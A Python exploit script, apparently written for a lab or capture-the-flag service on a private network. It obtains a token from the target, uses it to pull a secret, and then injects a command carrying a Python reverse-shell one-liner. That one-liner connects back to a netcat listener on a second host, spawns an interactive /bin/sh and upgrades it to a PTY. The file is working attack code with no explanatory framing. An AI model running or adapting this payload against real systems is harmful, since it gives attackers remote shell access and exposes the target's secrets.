import socket
import re
import sys
from subprocess import PIPE, Popen
from threading import Thread

HOST = '192.168.86.61'
PORT = 3905

NC_HOST = '192.168.86.93'
NC_PORT = 5000


def get_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    return s


def send(tosend):
    s = get_socket()
    s.sendall(tosend)
    s.close()


def send_recv(to_send):
    s = get_socket()
    s.sendall(to_send)
    data = s.recv(1024)
    s.close()
    return data


def get_match(data):
    match = re.findall(r" '(.+?)'", data, re.MULTILINE)
    if match:
        return match[0]
    else:
        return False


def get_token():
    data = send_recv(b'token\n')
    # data should contain our token, so we have to parse it.
    output = data.decode("utf-8")
    key = get_match(output)
    if key:
        print("Got token! " + key)
        return key
    return False


def get_secret(token):
    data = send_recv(b'secret ' + bytes(token, "utf-8") + b'\n')
    output = data.decode("utf-8")
    return output


def enqueue_output(out):
    try:
        for line in iter(lambda: out.read(1), b''):
            if not line:
                return
            print(line, end="", flush=True)
    except KeyboardInterrupt:
        return


def run_command(cmd, token):
    proc = Popen(["nc", "-l", "-vvvvv", "-p", str(NC_PORT)], shell=False, stdin=PIPE, stdout=PIPE, stderr=PIPE, encoding='utf-8')
    t = Thread(target=enqueue_output, args=(proc.stdout,))
    t.daemon = True

    send(bytes(cmd, 'utf-8') + b' ' + bytes(token, 'utf-8'))
    print("Successfully launched shell, should connect to {}:{}".format(NC_HOST, NC_PORT))

    # spawn tty
    checktty = proc.stdout.readline()
    if checktty.startswith("/bin/sh: 0: can't access tty;"):
        proc.stdin.write("python -c 'import pty; pty.spawn(\"/bin/bash\");'\n")
        proc.stdin.flush()
        print("Upgraded shell to tty.")
        proc.stdout.read(2)
        proc.stdout.flush()
    else:
        print(checktty, end="", flush=True)
    t.start()

    while 1:
        try:
            line = sys.stdin.readline()
        except KeyboardInterrupt:
            t.join(1)
            proc.stdin.write("exit")
            proc.wait()
            break

        if not line:
            break

        proc.stdin.write(line)
        proc.stdin.flush()


tok = get_token()
if tok:
    tsecret = get_secret(tok)
    if tsecret:
        tsecret = get_match(tsecret)
        print("Secret: " + tsecret)
    else:
        print("Failed to get secret.")
else:
    print("Failed to get token.")

tok = get_token()
if tok:
    run_command('"python -c \\\"import socket,subprocess,os;'
                's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\''
                '' + NC_HOST + '\', ' + str(NC_PORT) + ''
                '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);'
                ' os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);\\\""', tok)
else:
    print("Failed to get token while running command.")

print("Closing...")